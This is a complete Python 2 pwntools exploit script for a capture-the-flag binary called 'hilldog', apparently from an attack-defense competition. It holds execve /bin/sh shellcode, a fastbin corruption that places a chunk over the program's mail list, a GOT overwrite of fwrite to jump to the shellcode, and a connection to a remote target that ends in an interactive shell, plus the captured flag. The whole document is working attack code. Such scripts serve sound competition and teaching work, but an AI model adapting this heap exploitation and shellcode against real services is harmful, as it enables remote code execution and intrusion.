#!/usr/bin/env python2

from pwn import *

"""
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled -> can use shellcode
PIE       : disabled
RELRO     : Partial
"""

"""
0x00400000         0x00402000         r-xp		/home/user/Desktop/linux_pwn/Middle/hilldog
0x00602000         0x00603000         r-xp		/home/user/Desktop/linux_pwn/Middle/hilldog
0x00603000         0x00604000         rwxp(can execute)	/home/user/Desktop/linux_pwn/Middle/hilldog
"""

"""
--- functions ---
off_401D80      dq offset loc_40175A   
                dq offset loc_40103B
                dq offset loc_401198
                dq offset loc_4012BB
                dq offset loc_40138F
                dq offset loc_4015B2
                dq offset loc_4016B7
                dq offset loc_40170E
                dq offset loc_401730

"""

def Create(size):
	r.sendlineafter('?', '1')
	r.sendlineafter('>', 'A'*0x15c)
	r.sendlineafter('?', str(size))

def SaveMail():
	r.sendlineafter('?', '3')	

def ForgeMail(index,context):
	r.sendlineafter('?', '4')
	r.sendlineafter('?', str(index))
	r.sendlineafter('?:', 'n')
	r.sendlineafter('\n', context)	

def ForgetMail(index):
	r.sendlineafter('?', '5')
	r.sendlineafter('?', str(index))

def EnterText(text):
	r.sendlineafter('?', '2')
	r.sendlineafter('>', 'a')
	r.sendlineafter('?', text)

sh_64 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

##############################
# fastbin corrupt version    #
##############################

#r = process('./hilldog')
r = remote('172.16.101.57', 12026)

r.sendlineafter(' ','./i_am_hilldog.exe')

a = raw_input(':')
Create(0x40)
SaveMail()
Create(0x30)
SaveMail()
ForgetMail(1)

#                                            fake fd
ForgeMail(0,'a'*0x40 + p64(0) + p64(0x40) + p64(0x603d98) )

Create(0x30) # just pass the chunck we don't need 

# get the chunck we want (mail list 0x603d98)
Create(0x30)

# Change 2nd Mail pointer to where we want write
#          1st heap(notuse)   2nd size      2nd heap (fwrite.got.plt)
EnterText(p64(0x603da0)   +  p64(0x100) + p64(0x6030b0) )

a = raw_input('?')

# overwrite fwrite.got.plt = fwrite.got.plt+8
# overwrite fwrite.got.plt+8 = sh_64
ForgeMail(1, p64(0x6030b8) + sh_64 )
a = raw_input('2')

r.interactive()

# AD{CaN_Y0U_s0lv3_Th1s_w1Th0UT_us1n9_Unl1nK?}















